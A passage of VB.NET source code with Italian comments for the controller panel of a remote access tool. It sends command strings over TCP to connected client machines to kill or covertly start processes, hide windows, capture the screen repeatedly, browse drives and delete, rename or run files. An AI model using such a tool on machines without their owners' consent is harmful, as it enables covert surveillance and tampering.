                frmMain.listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                frmMain.tmrPen.Start() 'Avvio il timer che accetta connessioni
            End If

            If frmMain.NumSock > 1 Then

                For chiu2 = lblClid.Text - 1 To frmMain.NumSock
                    frmMain.listener(chiu2) = frmMain.listener(chiu2 + 1)
                    frmMain.client(chiu2) = frmMain.client(chiu2 + 1)
                    frmMain.netstream(chiu2) = frmMain.netstream(chiu2 + 1)
                Next chiu2
                frmMain.NumSock = frmMain.NumSock - 1
            End If

            frmMain.lblCC.Text = "Connected Client(s): " & frmMain.NumSock
            frmMain.lstwIpReverse.Items.RemoveAt(lblClid.Text - 1) 'Rimuovo dalla lista l'IP selezionato
            frmMain.cmdClo.Enabled = True
            If Not frmMain.FInfo(lblClid.Text - 1) Is Nothing Then
                frmMain.FInfo(lblClid.Text - 1).Close()
            End If


            If Not Me.FPAN2(lblClid.Text - 1) Is Nothing Then
                Me.FPAN2(lblClid.Text - 1).Close()
            End If

            If Not Me.FPAN3(lblClid.Text - 1) Is Nothing Then
                Me.FPAN3(lblClid.Text - 1).Close()
            End If
            Me.Close()

            MsgBox("The client was not connected", MsgBoxStyle.Exclamation, "Error")
        End If
    End Sub

    Private Sub cmdOttieniP_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdOttieniP.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("{RemP]"), 0, UTF8.GetBytes("{RemP]").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub txtProID_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles txtProID.TextChanged
        Try
            If Not txtProID.Text = "" Then
                lstwProcessi.Items.Clear()
                Dim TxtToListPro As Integer
                TxtToListPro = 0
                For oo = 1 To txtProID.Lines.Length
                    TxtToListPro = TxtToListPro + 1
                    Dim SplitProAndID() As String
                    SplitProAndID = Split(txtProID.Lines(TxtToListPro - 1), "|<|>|")
                    Dim itmpro As ListViewItem 'Creo un nuovo elemento listview
                    itmpro = New ListViewItem(SplitProAndID, 1) 'Assegno gli elementi dell'array ad un nuovo elemento di listview
                    lstwProcessi.Items.Add(itmpro) 'Popolo la listview con gli elementi arrivati
                Next oo
                txtProID.Text = ""
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdCancellaL_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdCancellaL.Click
        lstwProcessi.Items.Clear()
    End Sub

    Private Sub cmdTerminaPN_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdTerminaPN.Click
        Try
            If Not lstwProcessi.SelectedIndices.Count <= 0 Then
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("[<PBter>]" & lstwProcessi.SelectedItems.Item(0).Text), 0, UTF8.GetBytes(
                        "[<PBter>]" & lstwProcessi.SelectedItems.Item(0).Text).Length) 'invio il comando il Client
                lstwProcessi.SelectedItems.Item(0).Remove()
            Else
                MsgBox("Select a process in the list!", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdTerminaPB_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdTerminaPB.Click
        Try
            If Not lstwProcessi.SelectedIndices.Count <= 0 Then
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("{<]KillP" & lstwProcessi.SelectedItems.Item(0).Text), 0, UTF8.GetBytes(
                        "{<]KillP" & lstwProcessi.SelectedItems.Item(0).Text).Length) 'invio il comando il Client
                lstwProcessi.SelectedItems.Item(0).Remove()
            Else
                MsgBox("Select a process in the list!", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdAvviAs_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdAvviAs.Click
        Try
            If Not txtProcessoDAA.Text = "" Then
                If rbtNo.Checked = True Then
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes("|\{ATT}\|\" & txtProcessoDAA.Text), 0, UTF8.GetBytes(
                            "|\{ATT}\|\" & txtProcessoDAA.Text).Length) 'invio il comando il Client
                End If
                If rbtMa.Checked = True Then
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes("<>>|Attma|" & txtProcessoDAA.Text), 0, UTF8.GetBytes(
                            "<>>|Attma|" & txtProcessoDAA.Text).Length) 'invio il comando il Client
                End If
                If rbtHi.Checked = True Then
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes("/\><rtaaHi>" & txtProcessoDAA.Text), 0, UTF8.GetBytes(
                            "/\><rtaaHi>" & txtProcessoDAA.Text).Length) 'invio il comando il Client
                End If
                If rbtMi.Checked = True Then
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes("(>mm>mi>" & txtProcessoDAA.Text), 0, UTF8.GetBytes(
                            "(>mm>mi>" & txtProcessoDAA.Text).Length) 'invio il comando il Client
                End If
            Else
                MsgBox("You have to write a process to start in the special textbox", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdGRW_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        'Try
        ' frmMain.netstream(
        'Me.lblClid.Text - 1).Write(
        ' UTF8.GetBytes("{(-/GeTW/)}"), 0, UTF8.GetBytes("{(-/GeTW/)}").Length) 'invio il comando il Client
        'Catch ex As Exception
        'ISPC = False
        'End Try
    End Sub

    Private Sub txtFina_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)
        'If Not txtFina.Text = "" Then
        'lstwWindowsA.Items.Clear()
        'Dim TxtToListPro2 As Integer
        'TxtToListPro2 = 0
        'For oo2 = 1 To txtFina.Lines.Length
        'TxtToListPro2 = TxtToListPro2 + 1
        ' Dim itmpro2 As ListViewItem 'Creo un nuovo elemento listview
        ' itmpro2 = New ListViewItem(txtFina.Lines(TxtToListPro2 - 1), 2) 'Assegno gli elementi dell'array ad un nuovo elemento di listview
        ' lstwWindowsA.Items.Add(itmpro2) 'Popolo la listview con gli elementi arrivati
        'Next oo2
        'txtFina.Text = ""
        'End If
    End Sub



    Private Sub cmdMax_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdMax.Click
        Try
            If Not lstwProcessi.SelectedIndices.Count <= 0 Then
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(">/Max|>" & lstwProcessi.SelectedItems.Item(0).Text), 0, UTF8.GetBytes(
                        ">/Max|>" & lstwProcessi.SelectedItems.Item(0).Text).Length) 'invio il comando il Client
            Else
                MsgBox("You have to select a process in the list", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdMin_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdMin.Click
        Try
            If Not lstwProcessi.SelectedIndices.Count <= 0 Then
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(">{Min}>" & lstwProcessi.SelectedItems.Item(0).Text), 0, UTF8.GetBytes(
                        ">{Min}>" & lstwProcessi.SelectedItems.Item(0).Text).Length) 'invio il comando il Client
            Else
                MsgBox("You have to select a process in the list", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdRes_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdRes.Click
        Try
            If Not lstwProcessi.SelectedIndices.Count <= 0 Then
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("[/Rip\]" & lstwProcessi.SelectedItems.Item(0).Text), 0, UTF8.GetBytes(
                        "[/Rip\]" & lstwProcessi.SelectedItems.Item(0).Text).Length) 'invio il comando il Client
            Else
                MsgBox("You have to select a process in the list", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdHid_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdHid.Click
        Try
            If Not lstwProcessi.SelectedIndices.Count <= 0 Then
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("{^}NasC{^}" & lstwProcessi.SelectedItems.Item(0).Text), 0, UTF8.GetBytes(
                        "{^}NasC{^}" & lstwProcessi.SelectedItems.Item(0).Text).Length) 'invio il comando il Client
            Else
                MsgBox("You have to select a process in the list", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub


    Private Sub tmrPannSchermo_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrPannSchermo.Tick
        If listenerschermo.Pending Then
            clientschermo = listenerschermo.AcceptTcpClient()
            netstreamschermo = clientschermo.GetStream()
            tmrPannSchermo.Stop()
            ISPCschermo = True
            tmrDatiSchermo.Start()
        End If
    End Sub

    Private Sub tmrDatiSchermo_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiSchermo.Tick
        If ISPCschermo = True Then
            If clientschermo.Available > 0 Then
                Dim buffer4(clientschermo.Available - 1) As Byte
                netstreamschermo.Read(buffer4, 0, buffer4.Length)
                Dim NumF As Integer
                NumF = Me.lblClid.Text + 2
                If Not FPAN2(Me.lblClid.Text - 1) Is Nothing Then
                    If InStr(UTF8.GetString(buffer4), "<<LookSize>>") Then
                        FileClose(NumF)
                        FPAN2(Me.lblClid.Text - 1).prgImmR.Maximum = Replace(UTF8.GetString(buffer4), "<<LookSize>>", "")


                        If Not Directory.Exists(Application.StartupPath & "\Computers") = True Then
                            MkDir(Application.StartupPath & "\Computers")
                            If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text) = True Then
                                MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text)

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                                End If

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                                End If
                            End If
                        Else
                            If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text) = True Then
                                MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text)

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                                End If

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                                End If
                            Else

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                                End If

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                                End If
                            End If
                        End If
                        If Dir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot" & "\" & Me.lblClid.Text - 1 & ".jpg") <> "" Then
                            Kill(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot" & "\" & Me.lblClid.Text - 1 & ".jpg")
                        End If
                        FileOpen(NumF, Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot" & "\" & Me.lblClid.Text - 1 & ".jpg", OpenMode.Binary)
                        Try
                            netstreamschermo.Write(
                                UTF8.GetBytes("{Ok}"), 0, UTF8.GetBytes(
                                    "{Ok}").Length) 'invio il comando il Client
                        Catch ex As Exception
                            FPAN2(Me.lblClid.Text - 1).LoopScreen = False
                            Me.ISPCschermo = False
                        End Try

                    Else
                        Try
                            FilePut(NumF, buffer4) '12
                        Catch ex As Exception
                            FileClose(NumF)
                            FPAN2(Me.lblClid.Text - 1).Close()
                        End Try
                        If Not FPAN2(Me.lblClid.Text - 1).prgImmR.Value + buffer4.Length > FPAN2(Me.lblClid.Text - 1).prgImmR.Maximum Then
                            FPAN2(Me.lblClid.Text - 1).prgImmR.Value = FPAN2(Me.lblClid.Text - 1).prgImmR.Value + buffer4.Length 'FileLen(Application.StartupPath & "\S.jpg")
                        End If
                        If FPAN2(Me.lblClid.Text - 1).prgImmR.Value = FPAN2(Me.lblClid.Text - 1).prgImmR.Maximum Then
                            FPAN2(Me.lblClid.Text - 1).prgImmR.Value = 0
                            FileClose(NumF)
                            If Dir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot" & "\" & Me.lblClid.Text - 1 & ".jpg") <> "" Then
                                Try
                                    FPAN2(Me.lblClid.Text - 1).picImm.Load(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot" & "\" & Me.lblClid.Text - 1 & ".jpg")
                                Catch ex As Exception
                                End Try
                            End If
                            If FPAN2(Me.lblClid.Text - 1).LoopScreen = True Then
                                Try
                                    If Me.picScreen.BackColor = Color.Red Then
                                        MsgBox("The screen client is not connected!", MsgBoxStyle.Exclamation)
                                    End If
                                    netstreamschermo.Write(UTF8.GetBytes("<Take>"), 0, UTF8.GetBytes("<Take>").Length) 'invio il comando il Client
                                Catch ex As Exception
                                    FPAN2(Me.lblClid.Text - 1).LoopScreen = False
                                    Me.ISPCschermo = False
                                End Try
                            End If
                        End If

                    End If
                End If
            End If
        Else
            FileClose(Me.lblClid.Text + 2)
            If Not FPAN2(Me.lblClid.Text - 1) Is Nothing Then
                FPAN2(Me.lblClid.Text - 1).LoopMouse = False
                FPAN2(Me.lblClid.Text - 1).LoopScreen = False
                FPAN2(Me.lblClid.Text - 1).Close()
            End If
            clientschermo.Close()
            tmrDatiSchermo.Enabled = False
            tmrPannSchermo.Enabled = False
            picScreen.BackColor = Color.Red
            MsgBox("The screen server was not connected!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub cmdVisII_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdVisII.Click
        FPAN2(Me.lblClid.Text - 1) = New frmScreen
        FPAN2(Me.lblClid.Text - 1).lblIDC.Text = Me.lblClid.Text
        FPAN2(Me.lblClid.Text - 1).Text = "Screen viewer - " & Split(Me.Text, " - ")(1)
        FPAN2(Me.lblClid.Text - 1).Show()
        cmdVisII.Enabled = False
    End Sub

    Private Sub cmdGDSR_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdGDSR.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("<>|XYDES"), 0, UTF8.GetBytes("<>|XYDES").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub


    Private Sub cmdPiPP_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdPiPP.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes(" <óÔIÂy> " & txtTesto.Text), 0, UTF8.GetBytes(" <óÔIÂy> " & txtTesto.Text).Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdCancellaTestoP_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdCancellaTestoP.Click
        txtTesto.Text = ""
    End Sub

    Private Sub cmdPrintOnDesk_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdPrintOnDesk.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes(txtTesto.Text & "<|óð1╠à½|>"), 0, UTF8.GetBytes(txtTesto.Text & "<|óð1╠à½|>").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdResText_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdResText.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("╠à½|"), 0, UTF8.GetBytes("╠à½|").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub


    Private Sub lblCl_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub cmdGetDr_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdGetDr.Click
        Try
            STdrar = 0
            STdr = 0
            listdvs = ""
            txtPath.Text = ""
            lstwFileFolderR.Items.Clear()
            listf = ""
            STFIR = 0
            STFIRar = 0
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("!úVDiR♫!"), 0, UTF8.GetBytes("!úVDiR♫!").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub chkModListFD_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkModListFD.CheckedChanged
        Try
            If chkModListFD.Checked = True Then
                lstwFileFolderR.View = View.Tile
            Else
                lstwFileFolderR.View = View.Details
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdCCListFD_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdCCListFD.Click
        txtPath.Text = ""
        lstwFileFolderR.Items.Clear()
        listf = ""
        STFIR = 0
        STFIRar = 0
    End Sub

    Private Sub txtFeD_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles txtFeD.TextChanged
        Try
            If Not txtFeD.Text = "" Then

                lstwFileFolderR.SmallImageList = frmMain.imlstIP
                listf = ""
                STFIRar = 0
                STFIR = 0
                STdrar = 0
                STdr = 0
                listdvs = ""
                lstwFileFolderR.Enabled = False
                cmdCancellaL.Enabled = False
                cmdGetDr.Enabled = False
                For oo3 = 0 To txtFeD.Lines.Length - 1

                    Dim itmpro3 As ListViewItem 'Creo un nuovo elemento listview

                    If InStr(txtFeD.Lines(oo3), " <> ") Then
                        If Split(txtFeD.Lines(oo3), " <> ")(1) = " / " Then
                            itmpro3 = New ListViewItem(Split(txtFeD.Lines(oo3), " <> "), 4) 'Assegno gli elementi dell'array ad un nuovo elemento di listview

                            lstwFileFolderR.Items.Add(itmpro3) 'Popolo la listview con gli elementi arrivati

                        End If

                        If Split(txtFeD.Lines(oo3), " <> ")(1) = "Folder" Then
                            itmpro3 = New ListViewItem(Split(txtFeD.Lines(oo3), " <> "), 4) 'Assegno gli elementi dell'array ad un nuovo elemento di listview

                            lstwFileFolderR.Items.Add(itmpro3) 'Popolo la listview con gli elementi arrivati

                        End If

                        If Split(txtFeD.Lines(oo3), " <> ")(1) = "File" Then
                            itmpro3 = New ListViewItem(Split(txtFeD.Lines(oo3), " <> "), 5) 'Assegno gli elementi dell'array ad un nuovo elemento di listview

                            lstwFileFolderR.Items.Add(itmpro3) 'Popolo la listview con gli elementi arrivati

                        End If
                    End If

                Next oo3

                lstwFileFolderR.Enabled = True
                cmdCancellaL.Enabled = True
                cmdGetDr.Enabled = True
            End If

            txtFeD.Text = ""
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub lstwFileFolderR_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles lstwFileFolderR.DoubleClick

        If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then
            Dim SelItm As String
            SelItm = lstwFileFolderR.SelectedItems.Item(0).SubItems.Item(1).Text
            Dim SelItm2 As String
            SelItm2 = lstwFileFolderR.SelectedItems.Item(0).Text
            listf = ""
            STFIRar = 0
            STFIR = 0
            STdrar = 0
            STdr = 0
            listdvs = ""
            If SelItm = "Folder" Then
                Try

                    lstwFileFolderR.Enabled = False
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes("☼ä%Ìè" & txtPath.Text &
                                       SelItm2), 0, UTF8.GetBytes("☼ä%Ìè" & txtPath.Text &
                                       SelItm2).Length) 'invio il comando il Client
                    txtPath.Text = txtPath.Text & SelItm2 & "\"
                    lstwFileFolderR.Enabled = True
                Catch ex As Exception
                    ISPC = False
                End Try
            End If


            If SelItm = "Driver" Then
                Try

                    lstwFileFolderR.Enabled = False
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes("☼ä%Ìè" & txtPath.Text &
                                      SelItm2), 0, UTF8.GetBytes("☼ä%Ìè" & txtPath.Text &
                                      SelItm2).Length) 'invio il comando il Client
                    txtPath.Text = txtPath.Text & SelItm2 & "\"
                    lstwFileFolderR.Enabled = True
                Catch ex As Exception
                    ISPC = False
                End Try
            End If


            If SelItm = " / " Then

                If Not Split(txtPath.Text, "\")(UBound(Split(txtPath.Text, "\")) - 1) = "" Then
                    Try
                        lstwFileFolderR.Enabled = False
                        txtPath.Text = Replace(txtPath.Text, Split(txtPath.Text, "\")(UBound(Split(txtPath.Text, "\")) - 1) & "\", "")
                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("☼ä%Ìè" & txtPath.Text), 0, UTF8.GetBytes("☼ä%Ìè" & txtPath.Text).Length) 'invio il comando il Client
                        lstwFileFolderR.Enabled = True

                    Catch ex As Exception
                        ISPC = False
                    End Try
                Else

                    Try
                        txtPath.Text = ""

                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("!úVDiR♫!"), 0, UTF8.GetBytes("!úVDiR♫!").Length) 'invio il comando il Client
                    Catch ex As Exception
                        ISPC = False
                    End Try

                End If
            End If


        End If
    End Sub

    Private Sub lstwFileFolderR_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles lstwFileFolderR.MouseUp
        Try
            If e.Button = Windows.Forms.MouseButtons.Right Then

                cxmstrFileEDir.Show(Me.lstwFileFolderR, New Point(e.X, e.Y))

            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub







    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RefreshToolStripMenuItem.Click


        If Not txtPath.Text = "" Then

            Try
                listf = ""
                STFIRar = 0
                STFIR = 0
                STdrar = 0
                STdr = 0
                listdvs = ""
                lstwFileFolderR.Enabled = False
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("☼ä%Ìè" & txtPath.Text), 0, UTF8.GetBytes("☼ä%Ìè" & txtPath.Text).Length) 'invio il comando il Client

                lstwFileFolderR.Enabled = True
            Catch ex As Exception
                ISPC = False
            End Try

        Else

            MsgBox("There is not any path to refresh", MsgBoxStyle.Exclamation)

        End If


    End Sub




    Private Sub DeleteFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteFileToolStripMenuItem.Click

        If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then

            If Not txtPath.Text = "" Then

                If lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "File" Then
                    Try
                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("||;,_||" & txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text), 0, UTF8.GetBytes("||;,_||" & txtPath.Text &
                                                                                                                    lstwFileFolderR.SelectedItems.Item(0).Text).Length) 'invio il comando il Client




                    Catch ex As Exception
                        ISPC = False
                    End Try
                    lstwFileFolderR.SelectedItems.Item(0).Remove()
                Else
                    MsgBox("Please, select a file!", MsgBoxStyle.Information)
                End If

            Else

                MsgBox("There is not any selected path!", MsgBoxStyle.Information)
            End If

        Else
            MsgBox("Select a file to delete!", MsgBoxStyle.Exclamation)
        End If

    End Sub

    Private Sub DeleteEmptyFolderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteEmptyFolderToolStripMenuItem.Click

        If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then

            If Not txtPath.Text = "" Then

                If lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "Folder" Then
                    Try
                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("-_{}||ç" & txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text), 0, UTF8.GetBytes("-_{}||ç" & txtPath.Text &
                                                                                                                    lstwFileFolderR.SelectedItems.Item(0).Text).Length) 'invio il comando il Client


                    Catch ex As Exception
                        ISPC = False
                    End Try
                    lstwFileFolderR.SelectedItems.Item(0).Remove()
                Else
                    MsgBox("Please, select a folder!", MsgBoxStyle.Information)
                End If

            Else

                MsgBox("There is not any selected path!", MsgBoxStyle.Information)
            End If

        Else
            MsgBox("Select a folder to delete!", MsgBoxStyle.Exclamation)
        End If

    End Sub

    Private Sub RenameFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameFileToolStripMenuItem.Click

        If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then

            If Not txtPath.Text = "" Then

                If lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "File" Then
                    Dim risp As String
                    risp = InputBox("Write a new name..", "Rename file")
                    If Not risp = "" Then
                        Try
                            frmMain.netstream(
                                Me.lblClid.Text - 1).Write(
                                UTF8.GetBytes("{\|Ren}" & txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text & "^'}^" & risp), 0, UTF8.GetBytes("{\|Ren}" & txtPath.Text &
                                                                                                                        lstwFileFolderR.SelectedItems.Item(0).Text & "^'}^" & risp).Length) 'invio il comando il Client

                        Catch ex As Exception
                            ISPC = False
                        End Try

                        risp = ""
                    Else
                        risp = ""
                        MsgBox("The name is not valid", MsgBoxStyle.Exclamation)
                    End If
                Else
                    MsgBox("Please, select a file!", MsgBoxStyle.Information)
                End If

            Else

                MsgBox("There is not any selected path!", MsgBoxStyle.Information)
            End If

        Else
            MsgBox("Select a file to rename!", MsgBoxStyle.Exclamation)
        End If

    End Sub

    Private Sub RenameFolderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameFolderToolStripMenuItem.Click

        If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then

            If Not txtPath.Text = "" Then

                If lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "Folder" Then
                    Dim risp2 As String
                    risp2 = InputBox("Write a new name..", "Rename folder")
                    If Not risp2 = "" Then
                        Try
                            frmMain.netstream(
                                Me.lblClid.Text - 1).Write(
                                UTF8.GetBytes("{Di/ç\Ren}" & txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text & "°{}@" & risp2), 0, UTF8.GetBytes("{Di/ç\Ren}" & txtPath.Text &
                                                                                                                        lstwFileFolderR.SelectedItems.Item(0).Text & "°{}@" & risp2).Length) 'invio il comando il Client
                        Catch ex As Exception
                            ISPC = False
                        End Try
                        risp2 = ""
                    Else
                        risp2 = ""
                        MsgBox("The name is not valid", MsgBoxStyle.Exclamation)
                    End If
                Else
                    MsgBox("Please, select a folder!", MsgBoxStyle.Information)
                End If

            Else

                MsgBox("There is not any selected path!", MsgBoxStyle.Information)
            End If

        Else
            MsgBox("Select a folder to rename!", MsgBoxStyle.Exclamation)
        End If

    End Sub

    Private Sub StartFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartFileToolStripMenuItem.Click

        If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then

            If Not txtPath.Text = "" Then

                If Not lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "Driver" Then
                    Try
                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("[\Avv{Sta/]" & txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text), 0, UTF8.GetBytes("[\Avv{Sta/]" &
                                                                                                                                       txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text).Length) 'invio il comando il Client
                    Catch ex As Exception
                        ISPC = False
                    End Try

                Else
                    MsgBox("Please, select a file or a folder!", MsgBoxStyle.Information)
                End If

            Else

                MsgBox("There is not any selected path!", MsgBoxStyle.Information)
            End If

        Else
            MsgBox("Select a file or a folder to start!", MsgBoxStyle.Exclamation)
        End If

    End Sub



    Private Sub CopyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CopyToolStripMenuItem.Click
        Try
            If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then
                If Not lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "Driver" Then
                    If lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "File" Then
                        FoD = "File"
                    End If

                    If lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "Folder" Then
                        FoD = "Folder"
                    End If
                    txtClip.Text = txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text
                End If
            Else
                MsgBox("Select a file or a folder to copy!", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub PasteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PasteToolStripMenuItem.Click



        If Not txtPath.Text = "" Then


            If Not txtClip.Text = "" Then
                If FoD = "File" Then
                    Try
